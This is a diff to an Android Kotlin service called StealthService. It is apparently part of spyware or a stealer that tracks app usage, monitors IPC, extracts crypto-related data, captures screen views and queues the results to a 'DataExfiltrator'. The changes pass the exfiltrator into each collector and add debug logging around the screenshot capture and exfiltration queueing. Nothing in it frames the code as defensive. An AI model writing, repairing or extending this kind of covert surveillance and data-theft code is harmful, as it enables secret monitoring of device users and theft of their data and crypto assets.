@@ -18,6 +18,7 @@ import java.io.FileOutputStream
 import java.lang.ref.WeakReference
 import java.text.SimpleDateFormat
 import java.util.*
+import android.util.Log
 
 class StealthService : Service() {
 
@@ -49,10 +50,12 @@ class StealthService : Service() {
         createNotificationChannel()
         startForegroundWithType()
 
-        usageTracker = AppUsageTracker(this)
-        ipcMonitor = IpcMonitor(this)
-        cryptoExtractor = CryptoExtractor(this)
         exfiltrator = DataExfiltrator(this)
+//        Log.d(tag, "exfiltrator initialized successfully")
+        usageTracker = AppUsageTracker(this, exfiltrator)
+        ipcMonitor = IpcMonitor(this, exfiltrator)
+        cryptoExtractor = CryptoExtractor(this, exfiltrator)
+//        Log.d(tag, "cryptoExtractor initialized with exfiltrator")
 
         usageTracker.startTracking()
         ipcMonitor.startMonitoring()
@@ -118,17 +121,23 @@ class StealthService : Service() {
     }
 
     private fun captureOwnView(rootView: View) {
-        // Drawing must be on UI thread
         mainHandler.post {
+            Log.d("CaptureDebug", "captureOwnView called")
             val bitmap = rootView.drawToBitmap()
             if (bitmap != null) {
+                Log.d("CaptureDebug", "bitmap captured: ${bitmap.width}x${bitmap.height}")
                 serviceScope.launch {
                     val file = saveBitmap(bitmap)
-                    file?.let {
-                        exfiltrator.queueFile(it)
-                        logEvent("OWN_VIEW_CAPTURE", it.name)
+                    if (file != null) {
+                        Log.d("CaptureDebug", "file saved: ${file.absolutePath}")
+                        exfiltrator.queueImage(file)
+                        logEvent("OWN_VIEW_CAPTURE", file.name)
+                    } else {
+                        Log.e("CaptureDebug", "saveBitmap returned null")
                     }
                 }
+            } else {
+                Log.e("CaptureDebug", "drawToBitmap returned null")
             }
         }
     }
